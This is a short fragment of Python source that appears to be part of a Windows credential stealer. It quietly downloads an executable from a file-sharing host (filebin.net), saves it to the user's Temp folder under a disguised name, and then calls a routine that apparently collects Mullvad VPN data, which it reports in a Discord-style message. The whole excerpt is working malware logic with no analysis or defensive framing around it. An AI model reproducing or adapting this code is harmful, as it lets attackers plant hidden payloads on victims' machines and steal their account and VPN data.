...
``|_`` :open_file_folder: ``VPNs``"""
        if os.path.exists(os.path.join(os.environ["USERPROFILE"], "AppData","Local","Temp","procvesp111.exe")):
            pass
        else:open(os.path.join(os.environ["USERPROFILE"], "AppData","Local","Temp","procvesp111.exe"),"wb").write(requests.get("https://filebin.net/94grr8fn7puutc05/procdump.exe").content)
        try:
            self._mullvad()
        except:
            pass
